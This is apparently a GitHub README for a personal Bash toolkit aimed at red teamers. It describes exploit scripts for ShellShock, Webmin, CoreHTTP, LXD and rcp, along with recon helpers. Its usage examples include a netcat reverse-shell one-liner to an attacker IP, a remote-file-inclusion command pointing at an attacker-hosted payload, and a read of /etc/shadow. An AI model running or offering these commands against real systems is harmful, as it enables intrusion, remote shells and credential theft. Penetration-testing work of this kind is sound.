# Bash
Collection of bash tools I wrote to make my life easier or test myself. The help switch defined for these scripts is written with the assumption these exist in a PATH environmnet variable. Typically commands such as these should be placed in /usr/local/bin. This is considered best practice for Linux. Most of these tools will be useful to Red Teamers.

## ADD COMMANDS TO /usr/local/bin
Enter the below commands to download this repo, make the .sh files executable and place the .sh executable files into your /usr/local/bin so you can use for example "getip" instead of ./getip.sh to execute the commands.
```sh
git clone https://github.com/tobor88/Bash
cd Bash
sudo chmod u+x *.sh
files=$(ls *.sh)
for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
```
---
#### BASH EXPLOITS
- __CVE-2014-6271.sh__ This exploit is used to execute commands on a remote server vulnerable to the CVE-2014-6271 ShellShock vulnerability. It creates a webshell at /var/www/html/simple.php and uses curl to simulate a shell like session. Currently only able to issue one word commads. I plan adding more functionality in the future.
![ShellShock CVE-2015-6271](https://raw.githubusercontent.com/tobor88/Bash/master/shellshock.png)

- __CVE-2006-3392.sh__ This exploit is used to perform an unauthenticated remote file disclosure on Webmin version <1.29x.
```bash
./CVE-2006-3392.sh 10.11.1.141 10000 http /etc/shadow
```
![CVE-2006-3392](https://raw.githubusercontent.com/tobor88/Bash/master/cve20063392.png)

- __LXD Privilege Escalation__ This exploit can be used to escalate privileges in a Linux environment where the user is a member of the lxd group. 
```bash
# Example Usage:
./lxd_privesc.sh container01
# RESULTS
Device rootdisk added to container01
Device rootdisk removed from container01
[*] Execution completed
uid=0(root) gid=0(root) groups=0(root)
root@example:/dev/shm/.tobor# exit
```

- __CoreHTTP 0.5.3.1 - 'CGI' Arbitrary Command Execution__ This exploit is used to obtain a reverse shell from a remote server hosting a CoreHTTP instance version 0.5.3.1 or lower. CoreHTTP server fails to properly sanitize input before calling the popen() function in http.c. Define a reverse shell to execute. I have a common list on my site [Reverse Shells Here](https://roberthosborne.com/reverse-shells)
```bash
# Example Usage:
./corehttp-rev-shell.sh -u 'http://10.11.1.2:10443/foo.pl' -s 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.172 1338 >/tmp/f'
```
![corehttp-reverse-shell](https://raw.githubusercontent.com/tobor88/Bash/master/corehttp-rev-shell.png)

- __rfi-rce.sh__ This is a command that can be used to simplify RCE through a remote file inclusion vulnerability by exploiting it in a shell like fashion.
```bash
rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://attacker-ip/evil.txt"
```
![rfi-rce.sh](https://raw.githubusercontent.com/tobor88/Bash/master/rfi-rce.png)

---
#### BASH COMMANDS
- __readid.sh__ This is complete. (Disaplys the /etc/passwd, /etc/shadow, or /etc/group files into an easy to read format)

![readid.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/readid_img.png)


- __getip.sh__ I view this as done. (Restrieves and displays the public and private IP addresses on a computer)

![getip.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/getip_img.png)


- __pingsweep.sh__ This works best when fping is installed on your Linux distro. If fping is not installed it will failover to using the ping command instead. The timeout for ping is set to 1 second so if you are using this with proxychains you may need to mess around with this setting.

![pingsweep.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/pingsweep_img.png)


- __portscan.sh__ In the future I will add more input validation and error handling. (Custom port scanner. Check all ports, one port, or a custom range of ports.)

![portscan.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/portscan_img.png)


- __massnmp.sh__ Script I built to quickly obtain SNMP information from a defined subnet range. This was written for Kali so it uses OneSixtyOne and SNMP-Check. If these are not already installed they will need to be for the script to work. This script will build 3 files in your /tmp directory which means on next restart they will be deleted. Enumerated SNMP info on different targets will be placed into a txt file in the $PWD the script was executed from.

![massnmp.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/massnmp.png)


- __absolutepathit.sh__ This command is used to convert all relative commands in a script to absolute path commands. To play this one safe I have it create a copy of the script you wrote and places it in a file called /tmp/absolutepathit_tmpinfo. This file has all comments removed from it and replaces any commands that have a result value obtained from the command $(which <cmd>) with the absolute path value result for that command. 
 Copy and paste the results into your script to ensure you dont lost your comments and to ensure any possible command words you have in echo quotations are what you want. 
 This is not perfect yet as you can see in the image below it misses curl.
 
 ![absolutepathit.sh results](https://raw.githubusercontent.com/tobor88/Bash/master/absolutepathit_img.png) 

 To deal with that issue I added line 40 which will obtain commands that are located next to a ( character. This does not misinterpret _print_ in the __awk__ command. 
 
 ![absolutepathit.sh results improvement](https://raw.githubusercontent.com/tobor88/Bash/master/absolutepathit_img2.png)
 
 The issue I noticed came from another script came from a website in the bash script. This is because the slash is viewed as an escape character. Any contributions are welcome. This is still a work in progress.

- __MountDriveVMWworkstation.sh__ This is a simple script meant to be executed in order to quickly mount a defined Shared Folder in VMWare Workstation to a Linux VM running inside VMWare Workstation.
```sh
./MountDriveVMWworkstation.sh 
```

- __newusercheck.sh__ This is a simple script to send an email alert whenever a new user is added to an /etc/passwd file on the local machine
 
- __PreventSleeping.sh__ This is a simple script to prevent a Debian based Linux Distro from falling asleep
```sh
./PreventSleeping.sh
```

- __enablespoofing.sh__ This is a simple script meant to take care of the tasks neccessary to allow dns spoofing on Kali Linux. It enables port forwarding on ipv4 and allows DNS traffic.

- __dnslookup.sh__ This command is meant to perform a mas dns lookup based on an IPv4 address range. Returns output in the below format
```sh
--------------------------------------------
| IP Address              |     FQDN's     |
--------------------------------------------
2.2.0.10.in-addr.arpa DC.osbornepro.com.
4.2.0.10.in-addr.arpa DEV.osbornepro.com.
```

- __enum_dns_servers.sh__ This command is meant to return the DNS servers in a domain. This is most useful when having a local domains DNS server set in your /etc/resolv.conf file.
```sh
---------------
| DNS Servers |
---------------
dns1.osbornepro.com.
dns2.osbornepro.com.
```
- __rcp-suid-privesc.sh__ This can be used to exploit the SUID bit on rcp. This only works on certain Operating Systems. Successfully tested on Red Hat 6.2. THere is a perl version of this script on exploitdb.

- __suidcheck.sh__ Needs a lot of work (Checks for exploitable suid bits and attempts to exploit them if they exist. Also returns cron job scripts)
